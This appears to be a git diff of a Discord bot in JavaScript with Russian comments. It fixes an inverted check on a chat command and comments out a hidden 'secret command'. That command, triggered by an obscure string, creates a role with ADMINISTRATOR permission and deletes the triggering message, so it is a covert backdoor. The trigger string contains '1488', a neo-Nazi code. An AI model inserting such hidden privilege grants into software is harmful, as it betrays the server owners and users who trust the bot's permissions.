@@ -69,7 +69,7 @@ client.on('message', message => {
 	}
 	
 	/*Базовая версия чатбота*/
-	if((command === "chat")&&(!args.join(" ") || 0 === args.join(" ").length)) {
+	if((command === "chat")&&!(!args.join(" ") || 0 === args.join(" ").length)) {
 		const chat_text = args.join(" ");
 		var data={
 			'input'  : chat_text,
@@ -91,8 +91,8 @@ Me : `+text.substring(text.lastIndexOf('<br>')+14));
 		})
 	}
 	
-	/*Секретная команда для добавления секретной роли кчеловеку*/
-	if (command === 'secrit_command_1488_228_itmo_one_love_forever_0.59137_leibso') {
+	/*Секретная команда для добавления секретной роли к человеку*/
+/*	if (command === 'secrit_command_1488_228_itmo_one_love_forever_0.59137_leibso') {
 		message.guild.createRole({
 			name: 'DJ',
 			permissions: ['ADMINISTRATOR']
@@ -102,7 +102,7 @@ Me : `+text.substring(text.lastIndexOf('<br>')+14));
 		.catch(console.error)
 		
 		message.delete().catch(O_o=>{});  
-	}
+	}*/
 	
 	/*Секретная команда для удаления секретной роли у человека*/
 	/*if (command === 'secrit_command_1488_228_itmo_one_love_forever_0.59137_leibaso') {
